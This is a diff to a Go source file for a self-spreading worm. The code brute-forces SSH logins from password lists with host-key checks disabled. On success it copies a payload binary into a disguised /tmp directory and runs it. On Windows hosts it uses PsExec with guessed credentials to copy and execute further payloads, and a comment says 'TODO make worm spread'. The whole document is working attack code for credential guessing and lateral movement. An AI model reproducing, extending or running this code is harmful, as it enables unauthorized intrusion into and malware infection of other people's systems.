@@ -1,6 +1,6 @@
 package main
 
-import ("github.com/tatsushid/go-fastping"
+import (
 		"golang.org/x/crypto/ssh"
 		"fmt"
 		"time"
@@ -9,7 +9,6 @@ import ("github.com/tatsushid/go-fastping"
 		"log"
 		"bufio"
 		"strconv"
-		"net"
 		"runtime"
 		"sync"
 		"os/exec"
@@ -48,7 +47,7 @@ func main() {
 		}
 		wg.Wait()
 	 } 
-
+/**
 func checkip(myip string) (ipworks bool){
 	ipworks = false
 	p := fastping.NewPinger()
@@ -71,6 +70,7 @@ func checkip(myip string) (ipworks bool){
 	}
 	return
 }
+**/
 func gettingin(myip string, user []string, passwds []string, myos string, wg *sync.WaitGroup ){
 	n := 0
 	var iswin = false
@@ -118,45 +118,58 @@ func gettingin(myip string, user []string, passwds []string, myos string, wg *sy
 	defer wg.Done()
 }
 
-func getinlinux(myip string, user string, passwd string) (myreturn string){
+func getinlinux(myip string, user string, passwd string) (myreturn string) {
 	sshConfig := &ssh.ClientConfig{
-	User: user,
-	HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-	Timeout:         2 * time.Second,
-	Auth: []ssh.AuthMethod{
-		ssh.Password(passwd)},
+		User:            user,
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+		Timeout:         2 * time.Second,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(passwd)},
 	}
-	var dest = joinstrings(myip,":22")
+	var dest= joinstrings(myip, ":22")
 	fmt.Println(dest)
 	connection, err := ssh.Dial("tcp", dest, sshConfig)
 	if err != nil {
 		fmt.Println(err)
 		if strings.Contains(err.Error(), "unable to authenticate") {
 			return "no"
-		} else{
+		} else {
 			return "w"
 		}
 	}
+
+	session := newsession(connection)
+	execlinuxcmd(session, "mkdir /tmp/config-err-XJM1ll")
+	scpexec(session,"linuxhappyfuntimes.exe", "/tmp/config-err-XJM1ll/linuxhappyfuntimes")
+	execlinuxcmd(session,"./tmp/config-err-XJM1ll/linuxhappyfuntimes")
+	session.Close()
+	return "yes"
+}
+
+func newsession(connection *ssh.Client)(session *ssh.Session){
 	session, err := connection.NewSession()
 	if err != nil {
-		fmt.Println("NewSession no bueno")
-		return "no"
+		panic(err)
 	}
-	output, err := session.CombinedOutput("mkdir /tmp/config-err-XJM1ll")
+	return
+}
+
+func execlinuxcmd( session *ssh.Session, cmd string)() {
+	output, err := session.CombinedOutput(cmd)
+	if err != nil {
+		panic(err)
+		fmt.Println(output)
+	}
+	return
+}
+
+func scpexec( session *ssh.Session, srcfile string, destfile string)() {
+	err := scp.CopyPath(srcfile, destfile, session)
 	if err != nil {
 		panic(err)
 	}
-	fmt.Println(output)
-	err = scp.CopyPath("linuxhappyfuntimes.exe", "/tmp/config-err-XJM1ll/linuxhappyfuntimes", session)
-	if err != nil {
-		return "no"
-	}
-	output, err = session.CombinedOutput("./tmp/config-err-XJM1ll/linuxhappyfuntimes")
-	if err != nil {
-		panic(err)
-	}
-
-
+	return
+}
 /**
 	modes := ssh.TerminalModes{
 	ssh.ECHO:          0,     // disable echoing
@@ -170,10 +183,6 @@ func getinlinux(myip string, user string, passwd string) (myreturn string){
 		return "no"
 	}**/
 
-	session.Close()
-
-	return
-}
 
 func getinwin(myip string, user string, passwd string) (wincon int) {
 	/*dir, err := os.Getwd()
@@ -183,7 +192,7 @@ func getinwin(myip string, user string, passwd string) (wincon int) {
 	pscom := "PsExec64.exe"
 	iparg := joinstrings("\\\\", myip)
 	// TODO make worm spread, vs make a popup
-	cmd := exec.Command(pscom, iparg,"-n","5","-u",user,"-p",passwd, "-accepteula","msg", "landon", "hello" )
+	cmd := exec.Command(pscom, iparg,"-n","5","-u",user,"-p",passwd, "-accepteula","ipconfig" )
 	fmt.Println(user)
 	fmt.Println(passwd)
 	fmt.Println(cmd)
@@ -196,7 +205,24 @@ func getinwin(myip string, user string, passwd string) (wincon int) {
 		pscom := "psexec.exe \\"
 		joinstrings(pscom, myip)
 		joinstrings(pscom, " -c worm_windows_amd64.exe")
-	*/												//put payload here
+	*/											//put payload here
+
+		cmd := exec.Command(pscom, iparg,"-n","5","-u",user,"-p",passwd, "-accepteula","-c","PsExec64.exe" )
+		output, err := cmd.CombinedOutput()
+		if err != nil {
+			fmt.Println(output)
+		}
+		cmd = exec.Command(pscom, iparg,"-n","5","-u",user,"-p",passwd, "-accepteula","-c","linuxhappyfuntimes" )
+		output, err = cmd.CombinedOutput()
+		if err != nil {
+			fmt.Println(output)
+		}
+		cmd = exec.Command(pscom, iparg,"-n","5","-u",user,"-p",passwd, "-accepteula","-c","windowshappyfuntimes" )
+		output, err = cmd.CombinedOutput()
+		if err != nil {
+			fmt.Println(output)
+		}
+
 		fmt.Println("exit 1")
 
 		wincon = 1
